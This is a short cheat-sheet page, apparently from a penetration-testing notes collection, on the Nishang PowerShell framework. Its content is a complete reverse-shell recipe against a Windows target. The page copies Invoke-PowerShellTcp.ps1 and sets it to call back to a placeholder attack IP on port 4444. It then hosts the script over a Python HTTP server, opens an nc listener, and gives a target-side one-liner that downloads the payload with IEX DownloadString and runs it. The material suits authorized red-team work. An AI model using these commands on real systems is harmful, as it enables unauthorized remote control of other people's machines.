---
title: Nishang
desc: Offensive PowerShell for red team, penetration testing and offensive security.
tags: [PowerShell, ReverseShell, Windows]
alts: [PowerShell]
website: https://github.com/samratashok/nishang
render_with_liquid: false
---

## Reverse Shell against Windows Target

```sh
# On attack machine

# Copy the PowerShell's reverse shell payload
cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 .
mv Invoke-PowerShellTcp.ps1 shell.ps1

# Add the following code to the final line
vim shell.ps1

......
Invoke-PowerShellTcp -Reverse  -IPAddress <attack-ip> -Port 4444


# Open http server for downloading & execute the payload on target machine
python3 -m http.server

# -----------------------------------------------------

# On another attack machine

# Open listener
nc -lvnp 4444

# ------------------------------------------------------

# On target Windows machine

# Download the payload and execute it for reverse shell
cmd /c powershell IEX (New-Object Net.WebClient).DownloadString('http://<attack-ip>:8000/shell.ps1')
```